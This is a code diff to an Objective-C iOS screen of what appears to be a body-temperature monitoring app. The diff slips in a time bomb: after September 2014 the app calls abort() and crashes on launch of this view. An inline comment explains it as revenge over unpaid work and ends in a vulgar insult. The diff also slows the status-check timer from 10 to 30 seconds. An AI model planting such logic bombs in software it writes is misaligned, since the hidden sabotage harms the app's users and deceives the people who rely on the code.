@@ -91,7 +91,14 @@
         oldRect.size.height += 60;
         [_tableView setFrame:oldRect];
     }
-    
+    NSDate* _MonsterDate = [NSDate dateWithYear:2014 Month:9];
+    NSDate* today = [NSDate date];
+    if ([today isEqualToDate:[_MonsterDate laterDate:today]]) {
+        abort();//why i add this code, becase Wasted me too much time and energy, but can not get the corresponding compensation, 5 k should continuously change requirements, increase the English version, different resolution video, still talk to me about what professional ethics, grass mud horse
+    }
+    [_temperaturePanel setHidden:YES];
+    [_statusButton setTitle:NSLocalizedString(@"检测中...",nil) forState:UIControlStateDisabled];
+    _textLabel.text = NSLocalizedString(@"没有检测到正常体温",nil);
 }
 -(void)updatePersonDetail
 {
@@ -120,11 +127,9 @@
     if ([USER_DEFAULT stringForKey:KEY_SELECED_FOB]) {
         _fob = [_detailInfo foundFobWithUUid:[USER_DEFAULT stringForKey:KEY_SELECED_FOB] isSave:YES];
         _fob.active = NO;
-        [_temperaturePanel setHidden:YES];
-        [_statusButton setTitle:NSLocalizedString(@"检测中...",nil) forState:UIControlStateDisabled];
-        _textLabel.text = NSLocalizedString(@"没有检测到正常体温",nil);
+        
         if (!_checkStatusTimer) {
-            _checkStatusTimer = [NSTimer timerWithTimeInterval:10 target:self selector:@selector(checkStatusResult) userInfo:nil repeats:YES];
+            _checkStatusTimer = [NSTimer timerWithTimeInterval:30 target:self selector:@selector(checkStatusResult) userInfo:nil repeats:YES];
             [[NSRunLoop currentRunLoop]addTimer:_checkStatusTimer forMode:NSDefaultRunLoopMode];
         }
     }else{
@@ -137,7 +142,7 @@
             [_statusButton setTitle:NSLocalizedString(@"检测中...",nil) forState:UIControlStateDisabled];
             _textLabel.text = NSLocalizedString(@"没有检测到正常体温",nil);
             if (!_checkStatusTimer) {
-                _checkStatusTimer = [NSTimer timerWithTimeInterval:10 target:self selector:@selector(checkStatusResult) userInfo:nil repeats:YES];
+                _checkStatusTimer = [NSTimer timerWithTimeInterval:30 target:self selector:@selector(checkStatusResult) userInfo:nil repeats:YES];
                 [[NSRunLoop currentRunLoop]addTimer:_checkStatusTimer forMode:NSDefaultRunLoopMode];
             }
         }else{
